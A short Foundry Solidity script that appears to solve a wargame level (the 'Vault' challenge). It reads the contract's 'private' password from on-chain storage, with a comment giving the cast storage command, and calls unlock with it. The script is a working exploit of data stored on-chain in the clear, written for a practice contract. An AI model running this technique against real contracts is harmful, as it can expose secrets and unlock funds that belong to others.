// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import{Script,console} from "forge-std/Script.sol";
import{Vault} from "../src/Level8.sol";



contract Level8Solution is Script{
    Vault vault=Vault(0x50f9C15778B25157aA2ade3342D14eD214053d35);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("is vault locked",vault.locked());  // default getter for locked variable
        bytes32 vaultPassword=0x412076657279207374726f6e67207365637265742070617373776f7264203a29;   // getting password of the vault using cast
        vault.unlock(vaultPassword);
        console.log("is vault locked",vault.locked());
        vm.stopBroadcast();
    }


    // command to know read the storage:

    // command: cast storage contract address storage slot number
}